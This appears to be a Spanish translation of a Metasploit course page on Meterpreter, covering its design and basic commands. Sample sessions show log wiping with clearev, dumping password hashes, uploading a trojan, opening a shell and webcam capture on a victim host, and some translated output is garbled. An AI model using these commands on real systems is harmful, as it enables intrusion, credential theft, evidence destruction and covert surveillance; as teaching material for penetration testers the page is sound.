# Acerca de METERPRETER
## ¿QUÉ ES METERPRETER?
Meterpreter es una carga útil avanzada, dinámicamente extensible que se carga en memoria de inyección de DLL y se prolonga a través de la red en tiempo de ejecución. Se comunica a través del zócalo del stager y proporciona una API Ruby completa del lado del cliente. Cuenta con historial de comandos, finalización de pestañas, canales y más.

## CÓMO FUNCIONA METERPRETER
El objetivo ejecuta el stager inicial. Suele ser uno de los siguientes: bind, reverse, findtag, passivex , etc.
El organizador carga la DLL con el prefijo Reflective. El stub Reflective maneja la carga / inyección de la DLL.
El núcleo de Metepreter se inicializa, establece un enlace TLS / 1.0 sobre el socket y envía un GET. Metasploit recibe este GET y configura el cliente.
Por último, Meterpreter carga extensiones. Siempre cargará stdapi y cargará priv si el módulo otorga derechos administrativos. Todas estas extensiones se cargan sobre TLS / 1.0 usando un protocolo TLV.

## OBJETIVOS DE DISEÑO DE METERPRETER
### CAUTELOSO
- Meterpreter reside completamente en la memoria y no escribe nada en el disco.
- No se crean nuevos procesos, ya que Meterpreter se inyecta en el proceso comprometido y puede migrar a otros procesos en ejecución fácilmente.
- De forma predeterminada, Meterpreter utiliza comunicaciones cifradas.
- Todos estos proporcionan evidencia forense limitada e impacto en la máquina víctima.
 

### PODEROSO
- Meterpreter utiliza un sistema de comunicación canalizado.
- El protocolo TLV tiene pocas limitaciones.
 

### EXTENSIBLE
- Las funciones se pueden aumentar en tiempo de ejecución y se cargan a través de la red.
- Se pueden agregar nuevas funciones a Meterpreter sin tener que reconstruirlo.
- Adición de funciones en tiempo de ejecución
- Se agregan nuevas funciones a Meterpreter cargando extensiones.

- El cliente carga la DLL a través del socket.
- El servidor que se ejecuta en la víctima carga la DLL en memoria y la inicializa.
- La nueva extensión se registra en el servidor.
- El cliente de la máquina del atacante carga la API de extensión local y ahora puede llamar a las funciones de extensión.
- Todo este proceso es perfecto y tarda aproximadamente 1 segundo en completarse.


## COMANDOS BÁSICOS DE METERPRETER

### USO DE COMANDOS DE METERPRETER

Dado que Meterpreter proporciona un entorno completamente nuevo, cubriremos algunos de los comandos básicos de Meterpreter para que pueda comenzar y ayudarlo a familiarizarse con esta herramienta más poderosa. A lo largo de este curso, se cubren casi todos los comandos disponibles de Meterpreter. Para aquellos que no están cubiertos, la experimentación es la clave para un aprendizaje exitoso.

- AYUDA
El comando de ayuda , como es de esperar, muestra el menú de ayuda de Meterpreter.

	meterpreter > help
	
	Comandos básicos
	
	    Descripción del comando
	    ------- -----------
	    ? Menú de ayuda
	    background Fondos de la sesión actual
	    canal Muestra información sobre los canales activos.
	...recorte...

- Background

El comando en backgroud enviará la sesión actual de Meterpreter a un segundo plano y lo devolverá al indicador 'msf'. Para volver a su sesión de Meterpreter, simplemente interactúe con ella nuevamente.

	meterpreter > 
	exploit msf en segundo plano ( ms08_067_netapi )> session -i 1
	[*] Iniciando interacción con 1 ...
	
	meterpreter >

- Cat

El comando cat es idéntico al comando que se encuentra en los sistemas * nix. Muestra el contenido de un archivo cuando se proporciona como argumento.

	meterpreter > cat
	Uso: cat archivo
	
Uso de ejemplo:

	meterpreter > cat edit.txt
	¿Qué estás hablando de Willis?
	
	meterpreter >

- CD Y PWD

Los comandos cd y pwd se utilizan para cambiar y mostrar el trabajo actual directamente en el host de destino.
El cambio de directorio "cd" funciona de la misma manera que en los sistemas DOS y * nix.
De forma predeterminada, la carpeta de trabajo actual es donde se inició la conexión a su oyente.

ARGUMENTOS:

	 cd : ruta de la carpeta para cambiar a
	 pwd : no se requiere ninguna

Ejemplo de uso:

	meterpreter > pwd
	C:\
	meterpreter > cd c:\windows 
	meterpreter > pwd
	c:\windows
	meterpreter >

- CLEAREV

El comando clearev borrará los registros de aplicación , sistema y seguridad en un sistema Windows . No hay opciones ni argumentos.

Ejemplo de uso:

	meterpreter > clearev
	[*] Borrando 97 registros de la aplicación ...
	[*] Borrando 415 registros del sistema ...
	[*] Borrando 0 registros de Seguridad ...
	meterpreter >

- Download

El comando download descarga un archivo desde la máquina remota. Tenga en cuenta el uso de barras dobles al dar la ruta de Windows.

	meterpreter > download c:\\boot.ini
	[*] descargando: c:\boot.ini -> c:\boot.ini
	[*] descargado: c:\boot.ini -> c:\boot.ini /boot.ini
	meterpreter >

- EDIT

	meterpreter > ls
	
	Listado: C:\Documents and Settings\Administrator\Desktop
	================================================ ======
	
	Modo Tamaño Tipo Última modificación Nombre
	---- ---- ---- ------------- ----
	.
	...recorte...
	.
	100666 / rw-rw-rw- 0 fil 2012-03-01 13:47:10 -0500 edit.txt
	
	meterpreter > edit edit.txt


El comando de edición abre un archivo ubicado en el host de destino.
Utiliza el 'vim' para que todos los comandos del editor estén disponibles.

Uso de ejemplo:

	meterpreter > ls
	
	Listing: C:\Documents and Settings\Administrator\Desktop
	========================================================
	
	Mode              Size    Type  Last modified              Name
	----              ----    ----  -------------              ----
	.
	...snip...
	.
	100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt
	
	meterpreter > edit edit.txt

- Execute

El comando execute ejecuta un comando en el objetivo.

	meterpreter > execute -f cmd.exe -i -H
	Process 38320 created.
	Channel 1 created.
	Microsoft Windows XP [Version 5.1.2600]
	(C) Copyright 1985-2001 Microsoft Corp.
	
	C:\WINDOWS\system32>

- GETUID

La ejecución de getuid mostrará el usuario en el que el servidor Meterpreter se está ejecutando en el host.

	meterpreter > getuid
	Server username: NT AUTHORITY\SYSTEM
	meterpreter >

- HASHDUMP

El módulo de post explotación hashdump volcará el contenido de la base de datos SAM .


	meterpreter > run post/windows/gather/hashdump 
	
	[*] Obtaining the boot key...
	[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
	[*] Obtaining the user list and keys...
	[*] Decrypting user keys...
	[*] Dumping password hashes...
	
	Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
	dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
	SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
	victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
	meterpreter >


- Idletime

El comando idletime mostrará el número de segundos que el usuario de la máquina remota ha estado inactivo.


	meterpreter > idletime
	User has been idle for: 5 hours 26 mins 35 secs
	meterpreter >


- IPCONFIG

El comando ipconfig muestra las interfaces de red y las direcciones en la máquina remota.


	meterpreter > ipconfig
	
	MS TCP Loopback interface
	Hardware MAC: 00:00:00:00:00:00
	IP Address  : 127.0.0.1
	Netmask     : 255.0.0.0
	
	AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
	Hardware MAC: 00:0c:29:10:f5:15
	IP Address  : 192.168.1.104
	Netmask     : 255.255.0.0
	
	meterpreter >

- LPWD Y LCD

Los comandos lpwd y lcd se utilizan para mostrar y cambiar el directorio de trabajo local respectivamente.
Al recibir un shell Meterpreter, el directorio de trabajo local es la ubicación donde se inició la consola Metasploit.
Cambiar el directorio de trabajo le dará a su sesión de Meterpreter acceso a los archivos ubicados en esta carpeta.

Ejemplo de uso:

	meterpreter > lpwd
	/root
	
	meterpreter > lcd MSFU
	meterpreter > lpwd
	/root/MSFU
	
	meterpreter > lcd /var/www
	meterpreter > lpwd
	/var/www
	meterpreter >

- LS

Como en Linux, el comando ls listará los archivos en el directorio remoto actual.

	meterpreter > ls
	
	Listing: C:\Documents and Settings\victim
	=========================================
	
	Mode              Size     Type  Last modified                   Name
	----              ----     ----  -------------                   ----
	40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
	40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
	100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
	40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
	...snip...


- MIGRATE

Con el módulo de migración de post explotación, puede migrar a otro proceso en la víctima.

	meterpreter > run post/windows/manage/migrate 
	
	[*] Running module against V-MAC-XP
	[*] Current server process: svchost.exe (1076)
	[*] Migrating to explorer.exe...
	[*] Migrating into process ID 816
	[*] New server process: Explorer.EXE (816)
	meterpreter >


- PS

El comando ps muestra una lista de procesos en ejecución en el objetivo.

	meterpreter > ps
	
	Process list
	============
	
	    PID   Name                  Path
	    ---   ----                  ----
	    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
	    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
	    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
	...snip...


- RESOURCE

El comando  resource ejecutará las instrucciones de Meterpreter ubicadas dentro de un archivo de texto. Con una entrada por línea,  resource ejecutará cada línea en secuencia. Esto puede ayudar a automatizar las acciones repetitivas realizadas por un usuario.

De forma predeterminada, los comandos se ejecutarán en el directorio de trabajo actual (en la máquina de destino) y el archivo de recursos en el directorio de trabajo local (la máquina atacante). 

	meterpreter > recurso 
	Uso: recurso ruta1 ruta2 Ejecutar los comandos almacenados en los archivos proporcionados.
	meterpreter>


ARGUMENTOS:

- ruta1 : la ubicación del archivo que contiene los comandos para ejecutar.
- Path2Run : la ubicación donde ejecutar los comandos que se encuentran dentro del archivo

Ejemplo de uso:


	┌─[root@cs-academy]─[~]
	└──╼ # cat resource.txt
	ls
	background
	┌─[root@cs-academy]─[~]
	└──╼ #
	Ejecutando comando de recursos:
	meterpreter> > resource resource.txt
	[*] Reading /root/resource.txt
	[*] Running ls
	
	Listing: C:\Documents and Settings\Administrator\Desktop
	========================================================
	
	Mode              Size    Type  Last modified              Name
	----              ----    ----  -------------              ----
	40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .
	40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..
	100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk
	100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe
	100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk
	100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk
	
	[*] Running background
	
	[*] Backgrounding session 1...
	msf  exploit(handler) >


- Search

El comando search proporcionan una forma de localizar archivos específicos en el host de destino. El comando es capaz de buscar en todo el sistema o en carpetas específicas.
Los comodines también se pueden utilizar al crear el patrón de archivo para buscar.

	meterpreter > search
	[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
	ARGUMENTOS:
	File pattern:	 	May contain wildcards
	Search location:	Optional, if none is given the whole system will be searched.

Uso de ejemplo:

	meterpreter > buscar -f autoexec.bat
	Encontrado 1 resultado ...
	    c:\AUTOEXEC.BAT
	meterpreter > buscar -f sea * .bat c:\\xamp\\
	Encontrado 1 resultado ...
	    c:\\xampp\perl\bin\search.bat (57035 bytes)
	meterpreter >


- SHELL

El comando shell le presentará un shell estándar en el sistema de destino.

	meterpreter > shell
	Process 39640 created.
	Channel 2 created.
	Microsoft Windows XP [Version 5.1.2600]
	(C) Copyright 1985-2001 Microsoft Corp.
	
	C:\WINDOWS\system32>


- UPLOAD
Al igual que con el comando download, debe usar barras dobles con el comando upload .

	meterpreter > upload evil_trojan.exe c:\\windows\\system32
	[*] uploading  : evil_trojan.exe -> c:\windows\system32
	[*] uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
	meterpreter >

- WEBCAM_LIST

El comando webcam_list cuando se ejecuta desde el shell Meterpreter, mostrará las cámaras web actualmente disponibles en el host de destino.

Uso de ejemplo:

	meterpreter > webcam_list
	1: Creative WebCam NX Pro
	2: Creative WebCam NX Pro (VFW)
	meterpreter >

- WEBCAM_SNAP

El  comando webcam_snap ' toma una imagen de una cámara web conectada en el sistema de destino y la guarda en el disco como una imagen JPEG. De forma predeterminada, la ubicación para guardar es el directorio de trabajo actual local con un nombre de archivo aleatorio.

	meterpreter > webcam_snap -h
	Usage: webcam_snap [options]
	Grab a frame from the specified webcam.
	
	OPTIONS:
	
	    -h      Help Banner
	    -i   The index of the webcam to use (Default: 1)
	    -p   The JPEG image path (Default: 'gnFjTnzi.jpeg')
	    -q   The JPEG image quality (Default: '50')
	    -v   Automatically view the JPEG image (Default: 'true')
	
	meterpreter >
	OPCIONES:
	
	-h: muestra la información de ayuda para el comando
	-i opt: si hay más de 1 cámara web conectada, use esta opción para seleccionar el dispositivo para capturar la imagen
	        
	-p opt: cambia la ruta y el nombre de archivo de la imagen que se va a guardar
	-q opt: la calidad de imagen, 50 es la configuración predeterminada / media, 100 es la mejor calidad
	-v opt: de forma predeterminada, el valor es verdadero, que abre la imagen después de la captura.

Uso de ejemplo:

	meterpreter > webcam_snap -i 1 -v false
	[*] Starting...
	[+] Got frame
	[*] Stopped
	Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
	meterpreter >